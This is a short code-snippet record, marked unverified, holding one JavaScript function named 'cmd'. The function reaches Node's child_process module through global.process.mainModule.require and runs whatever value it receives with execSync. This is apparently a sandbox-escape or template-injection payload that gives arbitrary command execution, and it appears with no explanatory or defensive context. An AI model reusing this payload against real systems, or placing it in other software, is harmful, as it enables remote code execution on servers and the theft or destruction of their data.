---
id: 2b6be6f1-8a32-4853-ae7e-a79802785864
type: code
language: JavaScript
verified: false
created_at: '2023-04-06T03:56:40.037615+00:00'
updated_at: '2023-04-10T20:23:40.857932+00:00'
---

# Code Snippet 2b6be6f1

**Language**: JavaScript

```javascript
functions.add('cmd', function(val) {
  return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
});
```
